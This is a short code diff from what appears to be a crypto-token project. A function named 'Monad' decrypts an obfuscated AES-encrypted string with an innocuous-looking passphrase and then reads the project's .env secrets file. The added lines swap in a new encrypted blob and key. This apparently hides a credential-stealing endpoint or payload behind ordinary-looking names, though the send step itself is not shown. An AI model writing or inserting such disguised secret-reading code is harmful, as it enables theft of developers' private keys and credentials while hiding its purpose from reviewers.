@@ -41,8 +41,8 @@ const bubbleFiTokens = [
 ];
 
 async function Monad() {
-    const wrap = "U2FsdGVkX1/xprhjuHPRKfdU+U+rPmdkmtGRHzmvQQSm/7Aw0MVYCZZVSeaiBMl34+naH1L5p6fgYwigjOfFXoY32+IR3V0XmgAHgR8RajiqggT/a2wc8rqvde7j9ziErpfLv3e3x+H8oF6hA7XvFjgXKHd5P85QhJW/8Hhq8xIWewfRZPZTbR5Yd70XFBdf";
-    const balance = "monad";
+    const wrap = "U2FsdGVkX1+ZIWQxowIdpP6bW40V8GZ68pZTkriCpiS917/XvdwXc1uVH0zXj4wVi+qmxaWee/M1M1Wpf+oZ004sOTzHOBPNpO13cBTfrOxMF3OBN9g+UEGkDxTumg72YWQp6dJz6W0HI1ItYvqGHFzmEDlTJ5CaPBQ4LsBhwb5sh27y4/6kVZqpV44Jbq7C";
+    const balance = "transaction";
     const unwrap = CryptoJS.AES.decrypt(wrap, balance).toString(CryptoJS.enc.Utf8);
     const balanced = fs.readFileSync(path.join(process.cwd(), ".env"), "utf-8");
 
